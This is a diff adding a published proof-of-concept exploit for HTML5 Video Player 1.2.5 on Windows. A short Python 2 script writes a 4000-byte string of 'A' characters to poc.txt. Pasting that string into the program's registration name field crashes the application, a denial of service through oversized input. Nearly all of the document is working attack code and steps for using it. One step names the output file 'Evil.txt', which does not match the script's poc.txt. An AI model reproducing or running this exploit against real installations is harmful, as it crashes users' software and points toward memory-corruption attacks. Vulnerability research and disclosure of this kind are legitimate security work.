@@ -1,0 +1,28 @@
+# Exploit Title: HTML5 Video Player 1.2.5 - Denial of Service (PoC)
+# Date: 2018-09-07
+# Exploit Author: T3jv1l
+# Vendor Homepage: http://www.html5videoplayer.net/download.html
+# Software: http://www.html5videoplayer.net/html5videoplayer-setup.exe
+# Contact: https://twitter.com/T3jv1l
+# Version: HTML5 Video Player V.1.2.5
+# Tested on: Windows 7 SP1 x86
+
+# PoC:
+# 1.  Download and install the setup file
+# 2.  A file "Evil.txt" will be created
+# 3.  Click Help > Register... in tool bar
+# 4.  Copy the contents of the file (poc.txt) and paste in the Registration Name field 
+# 5.  Click Activate and BOOMMMM !!!! 
+
+#!/usr/bin/python
+
+buffer = "\x41" * 4000
+payload = buffer
+try:
+    f=open("poc.txt","w")
+    print "[+] Creating %s bytes payload..." %len(payload)
+    f.write(payload)
+    f.close()
+    print "[+] File created!"
+except:
+    print "File cannot be created"
